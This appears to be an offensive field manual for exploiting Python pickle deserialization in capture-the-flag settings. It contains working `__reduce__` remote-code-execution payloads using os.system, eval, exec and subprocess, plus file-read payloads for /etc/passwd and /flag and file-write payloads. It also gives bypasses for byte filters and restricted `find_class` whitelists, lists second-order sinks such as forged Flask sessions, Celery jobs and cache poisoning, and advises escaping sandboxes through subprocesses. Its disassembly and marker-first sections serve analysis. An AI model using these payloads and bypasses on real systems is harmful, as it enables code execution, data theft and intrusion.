# Python Pickle Deserialization — the full field manual

## The format — stack-machine opcodes, not a tree

```
\x80\x03     PROTO 3      (80 04 → p4, 80 05 → p5)
c            GLOBAL <mod>\n<attr>\n    → import mod, get attr
)            EMPTY_TUPLE
\x81         NEWOBJ
R            REDUCE        → callable(*args) ← THE RCE OPCODE
S            STRING 'x'
I            INT
L            LONG
G            BINFLOAT
N            NONE
\x94         FRAME (p4+)
\x85         TUPLE1   \x86 TUPLE2  \x87 TUPLE3
t            TUPLE
qNN          BINPUT  hNN   → memo slot
gNN          BINGET  jNN   → recall memo
0            POP     1     POP_MARK   2 DUP
.            STOP
a            APPEND  e     APPENDS
s            SETITEM u     SETITEMS
d            DICT    l     LIST      ( mark
\x8c         SHORT_BINUNICODE (p4)
\x95         FRAME
```

Every byte after `80 03` is a program a tiny VM executes — the object "is"
the opcodes. `tools/pickle_dis.py blob.pkl` walks them without running.

## __reduce__ — the whole exploit

`REDUCE` pops `callable, args` → runs `callable(*args)` → pushes result.
Your exploit class's `__reduce__` returns the pair:

```python
import pickle, os, base64
class Exploit:
    def __reduce__(self):
        return (os.system, ('id',))
pickle.dumps(Exploit())   # → \x80\x03cnt\nsystem\nq\x00X\x02...id\x85R.
```

The opcode stream literally says: `GLOBAL nt system` → tuple `('id',)` →
`REDUCE` → `nt.system('id')` runs at loads() time.

## Payload shapes — pick by what the sink returns

```python
# RCE — os.system, return code in place (you see '0', not output)
(os.system, ('id',))

# eval — result goes wherever the pickle value lands
(eval, ("__import__('os').popen('id').read()",))
(exec, ("import os;os.system('id')",))

# subprocess — output captured
(__import__('subprocess').check_output, (['id'],))

# file read — the open() handle is the value; stringified later
(open, ('/etc/passwd','r'))
(open('/flag').read,)   # can't — pick the callable pair instead:
(getattr(open('/flag'),'read'), ())   # still wrong — see reduce trick below
```

**The read-back trick:** `open()` returns a handle — the app must call
`.read()` on it. Prefer `eval(open('/flag').read())` or a tuple chain that
returns the CONTENT. A handle in the response is a silent dead-end.

```python
# file-write
(eval, ("open('/tmp/x','w').write('data')",))
```

## Protocol versions — pick the smallest that fits the sink

```
p0  ASCII text — human-readable, biggest, survives 7-bit channels
p1  binary numbers, still text-ish
p2  NEWOBJ, EXT opcodes — standard default for older code
p3  Python 3 default — bytes type, \x80\x03 prefix
p4  FRAME + SHORT_BINUNICODE — compact, Python 3.4+
p5  out-of-band buffers — Python 3.8+, rare in CTF
```

```python
pickle.dumps(obj, 0)   # force p0 — survives strict-ASCII channels
pickle.dumps(obj, 4)   # compact — when bytes are limited
```

```bash
# the sanctioned generator — marker first
python3 tools/pickle_gen.py --marker X1     # benign PWNED_X1 class
python3 tools/pickle_gen.py --cmd 'id'      # os.system RCE
python3 tools/pickle_gen.py --eval "open('/flag').read()" --protocol 0
```

## The marker-first discipline

`--marker TAG` builds an object whose class is literally named
`PWNED_TAG` with a `__reduce__` that returns a string — no code runs, no
harm. If `PWNED_X1` appears in the response, `pickle.loads` ran on your
bytes. Build `--cmd`/`--eval` only after that.

## Reading a captured blob — never unpickle it

```bash
python3 tools/pickle_dis.py capture.pkl
python3 tools/pickle_dis.py --b64 'gANjbnQKc3lzdGVt...'
python3 tools/pickle_dis.py capture.pkl --full
```

`pickle_dis` walks the opcodes with `pickletools`: every `GLOBAL` resolved to
`module.attr`, every `REDUCE` counted, the verdict
`data-only stream` vs `code-execution opcodes present`. NEVER `pickle.loads`
a suspect blob to "look at it" — that IS the exploit.

## Filter bypasses — when the sink checks the bytes

| Restriction | Bypass |
|---|---|
| `if b'os' in data or b'system' in data: reject` | use `builtins.eval` / `subprocess.check_output` — no `os`/`system` bytes |
| blacklist on `c`/`GLOBAL` module names | p4 `STACK_GLOBAL` + STACK opcodes — no `c` byte |
| whitelist of allowed globals | find an allowed global that reaches the same sink — e.g. `map`, `getattr`, `builtins.getattr` |
| length limit | p0 vs p4 size differs; `__reduce__` to `eval` is shortest |
| app strips non-ASCII | force `protocol=0` — pure ASCII |

### `find_class` restricted unpickler

A hardened sink overrides `Unpickler.find_class` to whitelist modules —
the only real defense. Bypass surface:

- A whitelisted module that re-exports a dangerous callable
  (`os` via `sys.modules`, `builtins` via `sys`).
- `__main__` classes — often whitelisted; an object of an app class with a
  useful `__reduce__`/`__setstate__`.
- `__getattr__`/`copyreg` tricks when the whitelist checks module names
  not the resolved attribute.

## Second-order — pickle in the channel nobody watches

- **Flask session** pre-1.0: signed `itsdangerous` wrapping a pickle → forge
  once you have `SECRET_KEY`
- **Django session** old signed-pickle serializer
- **Celery job** — the `body` field is pickled task args (pickle serializer)
- **Redis/memcached value** — app stores a pickled object, you write to the
  cache first (cache-poisoning → deserialization chain)
- **`shelve`/`dbm`** file the app re-opens
- **NumPy `.npy` `allow_pickle=True`** — an object array is a pickle stream
- **joblib / pandas `read_pickle`** — same sink, different caller

## RestrictedPython / hardened environment

If the challenge hands you a `pickle.loads` inside a sandbox (`RestrictedPython`,
audit hooks): the pickle still builds real objects — your `__reduce__`
callable is resolved at `find_class` time, before sandboxing touches it.
The pickle VM is OUTSIDE the sandbox; sandbox blocks the RESULT's behavior,
not the unpickling. Prefer `os.system`/`subprocess` (exit the sandbox via a
subprocess), not in-interpreter `eval`.

## Falsifiers

- Blob is JSON/zlib-wrapped data — never reaches `loads`.
- `pickle.loads(data, encoding='bytes')` on a v0-only-whitelist — verify by
  `UnpicklingError` diff.
- Session is `itsdangerous` JSON serializer — magic bytes are `eyJ` JSON,
  not `gAN`.
- A signature on the blob with an unleaked key — spend budget on the key,
  not the grammar.

## Output to record

- Protocol version used + why (channel constraint)
- The `__reduce__` pair exactly (callable + args)
- The verbatim response excerpt carrying the marker/RCE output
- The generator invocation that minted it
